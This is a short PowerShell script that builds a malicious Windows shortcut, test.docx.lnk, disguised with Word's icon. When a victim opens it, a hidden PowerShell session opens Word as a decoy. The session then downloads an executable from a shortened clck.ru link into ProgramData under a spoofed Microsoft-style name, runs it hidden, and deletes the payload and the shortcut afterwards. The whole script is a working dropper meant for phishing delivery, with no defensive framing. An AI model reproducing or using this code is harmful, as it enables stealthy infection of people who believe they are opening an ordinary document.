$url = 'https://clck.ru/<file>'
$output = 'C:\ProgramData\Microsoft.SqlServer.C0mpact.WindowsHolographicDevices400.32.bc.exe'
$shortcutPath = "$PWD\test.docx.lnk"

$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut($shortcutPath)
$Shortcut.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"

$psCommand = @"
[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12

Start-Process -FilePath 'C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE' -ArgumentList '$env:APPDATA\Microsoft\Templates\Normal.dotm'

Invoke-WebRequest -Uri $url -OutFile $output -UseBasicParsing
Start-Sleep -Seconds 1
Start-Process -FilePath $output -Wait -WindowStyle Hidden

Start-Sleep -Seconds 1
if (Test-Path $output) { Remove-Item -Path $output -Force }
if (Test-Path $shortcutPath) { Remove-Item -Path $shortcutPath -Force }
"@

$Shortcut.Arguments = "/nop /noni -WindowStyle Hidden -Command `"& { $psCommand }`""
$Shortcut.IconLocation = 'C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,0'
$Shortcut.Save()

